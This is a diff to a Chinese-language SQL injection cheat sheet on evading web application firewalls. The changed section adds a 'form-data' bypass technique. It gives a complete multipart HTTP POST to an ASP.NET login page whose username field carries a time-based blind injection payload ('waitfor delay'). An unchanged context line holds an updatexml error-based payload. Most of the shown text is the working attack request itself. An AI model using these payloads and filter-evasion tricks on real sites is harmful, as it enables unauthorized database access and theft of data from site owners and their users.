@@ -126,8 +126,48 @@ updatexml(XML_document, XPath_string, new_value);该函数是XML文档处理函�
 	'||updatexml(1,if(database() = 'database',1,user()),1)||'
 
 
-### 13. 数据提交格式变种，绕过检测  
-正常的数据请求通过GET/POST，携带参数进行请求，可以将请求形式该为文件上传的请求形式。  
+### 13. form-data格式绕过  
+form-data是http请求中的multipart/form-data,它会将表单的数据处理为一条消息，以标签为单元，用分隔符分开。既可以上传键值对，也可以上传文件。  
+
+利用POSTMAN可以将application/x-www-form-urlencoded类型转换为form-data类型：
+	
+	POST / HTTP/1.1
+	Host: www.xa.wap.xxxx.cn:8888
+	Origin: http://www.xa.wap.vivo.cn:8888
+	Upgrade-Insecure-Requests: 1
+	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/	537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/	webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+	Content-Type: multipart/form-data; boundary=----	WebKitFormBoundary7MA4YWxkTrZu0gW
+	Cache-Control: no-cache
+	Postman-Token: 3d1ccd3c-2549-758f-33e6-b7c22ed8c45e
+	Content-Length: 1066
+
+	------WebKitFormBoundary7MA4YWxkTrZu0gW
+	Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+	/wEdAAR6h5yxkYVBMbqeksjQMHd3Snv2O3fUgbn2xhKdsOTix5/	NcOJr6eLkhJ4xDLXjUJKinihG6d/Xh3PZm3b5AoMQXhP/	aH8e3q0LJbMTJkk97AkdhYDSUoR9lDSE5JtYdZw=
+	------WebKitFormBoundary7MA4YWxkTrZu0gW
+	Content-Disposition: form-data; name="__VIEWSTATE"
+
+	/wEPDwUKLTcxMDgzNzc1Ng9kFgICAw9kFgJmDw8WAh4EVGV4dAUY55So5oi35ZCN5oiW5a+G56CB6ZSZ6K+vZGRkrLPUArQDnfMqb2ocyGYiB1epXLqRvXFDCOBrispf2f4=
+	------WebKitFormBoundary7MA4YWxkTrZu0gW
+	Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+	8D747DD8
+	------WebKitFormBoundary7MA4YWxkTrZu0gW
+	Content-Disposition: form-data; name="tbPassWord"
+
+	admin
+	------WebKitFormBoundary7MA4YWxkTrZu0gW
+	Content-Disposition: form-data; Content-Type:application/x-www-form-urlencoded; name="tbUserId"
+
+	admin';waitfor%20delay%20'0:0:20'--%20
+	------WebKitFormBoundary7MA4YWxkTrZu0gW--
+	Content-Disposition: form-data; Content-Type:application/x-www-form-urlencoded; name="btnLogin"
+
+	%E7%99%BB%E5%BD%95
+	------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
 
 ### 14. 判断数据库技巧  
 1. Access一般用于小网站，类似企业站，功能比较简单，对数据要求不高。  
